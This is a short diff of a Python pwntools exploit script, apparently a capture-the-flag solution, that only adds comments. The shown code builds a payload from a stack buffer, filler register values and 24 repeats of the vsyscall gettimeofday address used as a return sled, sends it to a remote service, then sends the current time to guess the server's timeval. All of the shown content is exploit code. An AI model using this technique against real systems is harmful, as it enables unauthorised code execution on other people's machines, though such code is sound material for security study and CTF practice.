@@ -66,10 +66,10 @@ pop_rbx = p64(0xdeadbeefdeadbeef)
 pop_rbp = p64(0xcafebabecafebabe)
 sys_gettimeofday = p64(0xffffffffff600400)
 
-payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24
+payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  # 24 times of gettimeofday()
 
 r.send(payload + '\n')
 
-r.send(p64(int(time.time())) + '\n')
+r.send(p64(int(time.time())) + '\n')  # guess remote timeval
 
 print r.recv(1024)
